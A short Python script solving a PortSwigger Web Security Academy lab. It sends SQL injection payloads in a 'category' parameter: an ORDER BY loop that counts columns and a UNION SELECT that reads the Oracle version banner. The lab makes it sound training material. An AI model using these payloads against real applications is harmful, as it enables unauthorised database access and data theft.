# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

import requests
requests.packages.urllib3.disable_warnings()

base = "https://ac881fb71fc6397c80e8176600eb002b.web-security-academy.net"
path = "/filter"
url = base + path

proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False
cookies = {"session": "RvC1zXxKDY9yelddAAqF0oH4m9i8XJu2"}

def findNumberOfColumns():
    for i in range(1,11):
        q = f"' ORDER BY {i}-- "
        params = {"category": q}
        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

def queryingDatabaseVersionOracle():
    q = f"' UNION SELECT banner, NULL FROM v$version--"
    params = {"category": q}
    requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)

# findNumberOfColumns()
queryingDatabaseVersionOracle()